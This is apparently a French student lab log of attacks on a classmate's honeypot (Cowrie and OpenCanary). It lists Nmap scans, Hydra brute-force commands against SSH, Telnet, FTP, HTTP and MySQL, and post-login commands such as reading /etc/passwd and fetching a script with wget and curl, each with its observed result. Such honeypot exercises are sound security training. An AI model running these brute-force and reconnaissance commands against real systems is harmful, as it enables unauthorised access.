# Journal des scénarios d'attaque — Lina

Cible : honeypot d'Alae (`172.20.10.6`, réseau bridgé VMware)
Attaquante : Lina (Kali Linux, IP `172.20.10.2`)

## Reconnaissance

| Date | Outil | Cible | Commande | Résultat |
|---|---|---|---|---|
| 2026-11-18 | Nmap | 172.20.10.6 | `nmap -sV -p 2222,2223 172.20.10.6` | Port 2222/tcp open (OpenSSH 9.2p1, honeypot Cowrie), 2223/tcp open (Cowrie Honeypot telnetd) |
| 2026-11-20 | Nmap | 172.20.10.6 | `nmap -sV -p 21,80,2222,2223,3306 172.20.10.6` | 21/tcp open (vsftpd), 80/tcp open (Apache 2.2.22), 2222/tcp open (ssh), 2223/tcp open (telnet), 3306/tcp open (MySQL 5.5.43) |

## Brute force SSH (port 2222)

| Date | Outil | Commande | Résultat |
|---|---|---|---|
| 2026-11-18 | Hydra | `hydra -L users.txt -P passwords.txt -s 2222 ssh://172.20.10.6 -t 4 -o hydra_ssh.log` | Couple valide trouvé : `root` / mot de passe testé parmi `123456`, `password`, `admin`, `ubuntu` (connexion réussie au 3e essai) |

## Connexion manuelle SSH + reconnaissance post-connexion

| Date | Commande | Résultat |
|---|---|---|
| 2026-11-18 | `ssh root@172.20.10.6 -p 2222` | Connexion réussie au faux shell Cowrie (`root@srv-prod-01:~#`) |
| 2026-11-18 | `uname -a` | `Linux srv-prod-01 6.1.0-21-amd64 ... x86_64 GNU/Linux` (faux système simulé par Cowrie) |
| 2026-11-18 | `cat /etc/passwd` | Liste de comptes système factices affichée |
| 2026-11-18 | `whoami` | `root` |
| 2026-11-18 | `ps aux` | Liste de processus factices (nginx, mysqld, ejabberd, sshd, etc.) |
| 2026-11-18 | `wget http://example.com/test.sh` | Téléchargement simulé réussi (577 octets, faux fichier sauvegardé) |
| 2026-11-18 | `curl http://example.com/test.sh` | Fausse page HTML "Example Domain" renvoyée par Cowrie |
| 2026-11-24 | `curl http://example.com/test.sh` (session de suivi) | Même comportement confirmé, cohérence de la simulation dans le temps |

## Brute force Telnet (port 2223)

| Date | Outil | Commande | Résultat |
|---|---|---|---|
| 2026-11-18 | Hydra | `hydra -L users.txt -P passwords.txt -s 2223 telnet://172.20.10.6 -t 1 -w 10 -o hydra_telnet.log` | Tentatives envoyées ; Telnet nativement lent/peu fiable à analyser (avertissement Hydra), session reprise avec `hydra -R` |

## Attaque FTP (port 21 — service OpenCanary)

| Date | Outil | Commande | Résultat |
|---|---|---|---|
| 2026-11-20 | Hydra | `hydra -L users.txt -P passwords.txt ftp://172.20.10.6 -t 4 -o hydra_ftp.log` | `0 valid password found` — comportement **attendu** : OpenCanary est un vrai "canari", il refuse systématiquement l'accès et se contente de journaliser chaque tentative (username/password) sans jamais accorder de connexion réelle |

## Attaque HTTP (port 80 — service OpenCanary)

| Date | Outil | Commande | Résultat |
|---|---|---|---|
| 2026-11-20 | curl | `curl -v http://172.20.10.6/` | Réponse `302 Found` (Apache/2.2.22), redirection systématique vers `/index.html` |
| 2026-11-20 | Hydra | `hydra -L users.txt -P passwords.txt 172.20.10.6 http-get / -o hydra_http.log` | Hydra a signalé "12 valid passwords found" — **faux positif identifié** : la page ne présente aucun mécanisme d'authentification réel (redirection 302 systématique), donc Hydra interprète à tort chaque tentative comme un succès. Non retenu comme preuve de compromission. |

## Attaque MySQL (port 3306 — service OpenCanary)

| Date | Outil | Commande | Résultat |
|---|---|---|---|
| 2026-11-20 | Hydra | `hydra -L users.txt -P passwords.txt mysql://172.20.10.6 -t 4 -o hydra_mysql.log` | `0 valid password found` — comportement attendu (OpenCanary, service canari) |

## Collecte et normalisation finale

| Date | Action | Résultat |
|---|---|---|
| 2026-11-26 | Récupération des fichiers bruts auprès d'Alae | `cowrie.json` + rotations quotidiennes (`.2026-11-11` à `.2026-11-20`) et `opencanary.log` |
| 2026-11-26 | Normalisation (`scripts/normalize_logs.py`) | 169 enregistrements fusionnés et triés chronologiquement au format commun `timestamp, ip_source, service, user, password, commande` |
| 2026-11-26 | Dépôt des résultats sur GitHub | `logs/logs_normalises_final.csv`, `logs/logs_normalises_final.json`, `scripts/normalize_logs.py` |

## Notes générales

- Les ports non standards (2222/2223 au lieu de 22/23) proviennent d'une redirection NAT configurée par Alae ; les ports 22/23 directs étaient filtrés par UFW.
- Plusieurs incidents réseau rencontrés et résolus en cours de route : passage de VirtualBox host-only à VMware bridgé, configuration VMnet0 sur la bonne carte physique, correction de règles UFW ne couvrant pas l'IP de l'attaquante.
- Les mots de passe testés proviennent exclusivement de la liste communiquée par Alae (`root/123456`, `root/password`, `admin/admin`, `ubuntu/ubuntu`) — aucun mot de passe réel n'a été utilisé.